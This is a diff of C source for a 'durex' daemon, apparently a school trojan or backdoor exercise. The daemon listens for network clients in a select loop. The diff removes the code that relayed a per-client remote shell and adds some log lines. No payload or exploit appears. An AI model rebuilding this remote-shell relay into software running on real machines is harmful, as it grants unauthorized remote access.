@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
-/*   Updated: 2018/08/21 09:04:03 by root             ###   ########.fr       */
+/*   Updated: 2018/08/26 23:08:14 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -68,11 +68,6 @@ static int			setupSelect()
 				max = e.server.client[i].fd;
 			FD_SET(e.server.client[i].fd, &e.server.fdr);
 			FD_SET(e.server.client[i].fd, &e.server.fdw);
-			if (e.server.client[i].shell[0] != -1) {
-				if (e.server.client[i].shell[0] > max)
-					max = e.server.client[i].shell[0];
-				FD_SET(e.server.client[i].shell[0], &e.server.fdr);
-			}
 		}
 		i++;
 	}
@@ -92,6 +87,7 @@ void				durex()
 		e.server.fd = openServer(SERVER_ADDR, SERVER_PORT);
 		serverLog("[LOGS] - Waiting for connections...");
 		mymemset(&timeout, 0, sizeof(timeout));
+		serverLog("[INFO] Process pid: %d", getpid());
 		while (1)
 		{
 			maxfd = setupSelect();
@@ -110,11 +106,10 @@ void				durex()
 					serverReadClient(&e.server.client[i]);
 				if (FD_ISSET(e.server.client[i].fd, &e.server.fdw))
 					serverWriteClient(&e.server.client[i]);
-				if (FD_ISSET(e.server.client[i].shell[0], &e.server.fdr))
-					serverReadClientShell(&e.server.client[i]);
 			}
 			check_library();
 		}
+		serverLog("Hm...");
 		uninstall_library();
 		quitClearlyServer();
 		quitClearlyDaemon();
